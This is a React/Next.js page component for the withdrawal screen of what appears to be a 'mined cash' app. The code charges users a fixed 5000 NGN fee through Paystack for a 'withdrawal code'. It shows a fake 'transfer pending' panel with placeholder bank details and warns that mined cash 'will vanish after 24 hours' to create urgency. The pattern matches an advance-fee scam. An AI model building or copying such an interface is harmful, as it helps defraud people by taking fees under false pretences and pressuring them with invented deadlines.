
"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { ArrowLeft, Landmark, Loader2 } from "lucide-react";
import { LoadingLink } from "@/components/ui/loading-link";
import { useRouter, useSearchParams } from "next/navigation";
import { useForm } from "react-hook-form";
import * as z from "zod";
import { usePaystackPayment } from "react-paystack";

import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useState, useEffect } from "react";
import { useToast } from "@/hooks/use-toast";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { AlertCircle } from "lucide-react";


const formSchema = z.object({
  email: z.string().email("Please enter a valid email address."),
  amount: z.coerce.number().min(200, "Amount must be 200 or more."),
});

export default function WithdrawPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [isPaying, setIsPaying] = useState(false);
  const { toast } = useToast();

  const getLinkWithParams = (pathname: string) => {
    const params = new URLSearchParams(searchParams.toString());
    return `${pathname}?${params.toString()}`;
  }

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: searchParams.get("email") || "",
      amount: 200,
    },
  });

  const {email, amount} = form.watch();

  const config = {
      reference: (new Date()).getTime().toString(),
      email,
      amount: 5000 * 100, // 5000 NGN, paystack amount is in kobo
      publicKey: process.env.NEXT_PUBLIC_PAYSTACK_PUBLIC_KEY!,
  };

  const initializePayment = usePaystackPayment(config);

  const onSuccess = () => {
    setIsPaying(false);
    toast({
      title: "Payment Successful",
      description: "You have successfully purchased a withdrawal code.",
    });

    const params = new URLSearchParams(searchParams.toString());
    params.set("amount", amount.toString());
    router.push(`/dashboard/withdraw/code?${params.toString()}`);
  };

  const onClose = () => {
    setIsPaying(false);
    console.log('closed');
  };

  function onBuyCode(values: z.infer<typeof formSchema>) {
    const params = new URLSearchParams(searchParams.toString());
    params.set("email", values.email);
    params.set("amount", values.amount.toString());
    router.replace(`/dashboard/withdraw?${params.toString()}`);
    
    setIsPaying(true);
    // The state update needs a moment to propagate before initializing payment
    setTimeout(() => {
        initializePayment({onSuccess, onClose});
    }, 100);
  }

  useEffect(() => {
      // Pre-fill email from search params if it exists
      const emailFromParams = searchParams.get("email");
      if (emailFromParams) {
          form.setValue("email", emailFromParams);
      }
  }, [searchParams, form]);


  return (
    <div className="flex w-full items-center justify-center">
      <Card className="w-full max-w-md bg-transparent border-0 shadow-none">
        <CardHeader className="text-center">
           <LoadingLink href={getLinkWithParams("/dashboard")} className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground justify-center mb-4">
             <ArrowLeft className="h-4 w-4" />
             Back to Dashboard
           </LoadingLink>
        </CardHeader>
        <CardContent className="space-y-4">
            <Alert variant="destructive" className="bg-primary/10 border-primary/20 text-primary">
              <AlertCircle className="h-4 w-4 !text-primary" />
              <AlertTitle className="text-primary">Important Withdrawal Information</AlertTitle>
              <AlertDescription className="text-primary/80">
                You must purchase a withdrawal code to proceed. Please note that your daily mined cash will vanish after 24 hours if not withdrawn. Withdraw your funds to avoid losing them.
              </AlertDescription>
            </Alert>


            <Card>
                <CardHeader className="text-center space-y-4">
                    <CardTitle className="text-lg">Waiting to receive payment from</CardTitle>
                     <div className="text-center text-muted-foreground">
                        <p>ACCOUNT NAME: {searchParams.get("name") || 'User'}</p>
                        <p>ACCOUNT NUMBER: {searchParams.get("account") || '0000000000'}</p>
                        <p>Bank: Your Bank</p>
                    </div>
                </CardHeader>
            </Card>
            
            <p className="text-center font-bold text-lg">TRANSFER PENDING</p>
            
            <div className="flex justify-center">
                <div className="bg-primary text-primary-foreground rounded-full p-4">
                    <Landmark className="h-8 w-8" />
                </div>
            </div>

            <Form {...form}>
                <form onSubmit={form.handleSubmit(onBuyCode)} className="space-y-4">
                    <Card className="p-4">
                        <FormField
                            control={form.control}
                            name="amount"
                            render={({ field }) => (
                            <FormItem className="grid grid-cols-3 items-center">
                                <FormLabel>Amount:</FormLabel>
                                <FormControl className="col-span-2">
                                    <Input type="number" {...field} />
                                </FormControl>
                                <FormMessage className="col-span-3" />
                            </FormItem>
                            )}
                        />
                        <FormField
                            control={form.control}
                            name="email"
                            render={({ field }) => (
                            <FormItem className="grid grid-cols-3 items-center mt-2">
                                <FormLabel>Email:</FormLabel>
                                <FormControl className="col-span-2">
                                    <Input type="email" placeholder="for-receipt@example.com" {...field} />
                                </FormControl>
                                <FormMessage className="col-span-3" />
                            </FormItem>
                            )}
                        />
                    </Card>

                    <Button type="submit" size="lg" className="w-full font-bold text-lg h-14" disabled={!form.formState.isValid || isPaying}>
                        {isPaying ? <Loader2 className="animate-spin" /> : "CONFIRM PAYMENT (NGN 5000)"}
                    </Button>
                </form>
            </Form>

        </CardContent>
      </Card>
    </div>
  );
}
